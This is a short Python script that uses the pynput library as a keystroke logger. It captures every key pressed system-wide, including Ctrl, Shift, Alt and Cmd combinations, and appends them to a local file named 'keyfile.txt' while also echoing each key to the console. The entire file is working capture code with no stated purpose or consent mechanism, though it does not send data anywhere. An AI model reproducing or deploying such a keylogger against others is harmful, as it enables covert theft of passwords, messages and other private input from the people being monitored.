from pynput import keyboard

modifier_map = {
    keyboard.Key.ctrl_l: "Ctrl",
    keyboard.Key.ctrl_r: "Ctrl",
    keyboard.Key.shift: "Shift",
    keyboard.Key.shift_l: "Shift",
    keyboard.Key.shift_r: "Shift",
    keyboard.Key.alt_l: "Alt",
    keyboard.Key.alt_r: "Alt",
    keyboard.Key.cmd: "Cmd",
    keyboard.Key.cmd_l: "Cmd",
    keyboard.Key.cmd_r: "Cmd"
}

current_modifiers = set()

def on_press(key):
    print(str(key))
    if key in modifier_map:
        current_modifiers.add(modifier_map[key])
        return
    combo = ""
    if current_modifiers:
        mods = [mod.lower() for mod in current_modifiers]
        combo = " + ".join(sorted(mods)) + " + "
    with open("keyfile.txt", "a") as logkey:
        try:
            char = key.char
            if ord(char) < 32: 
                char = chr(ord('a') + ord(char) - 1)
            logkey.write(f"{combo}{char.lower()}")
        except AttributeError:
            if key == keyboard.Key.space:
                logkey.write(f"{combo} ")
            elif key == keyboard.Key.enter:
                logkey.write(f"{combo}\n")
            elif key == keyboard.Key.tab:
                logkey.write(f"{combo}\t")
            elif key == keyboard.Key.backspace:
                logkey.write(f"{combo}\b")
            else:
                key_str = str(key).lower()
                logkey.write(f"{combo}{key_str}")
    current_modifiers.clear()

def on_release(key):
    if key in modifier_map and modifier_map[key] in current_modifiers:
        current_modifiers.remove(modifier_map[key])

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    input()
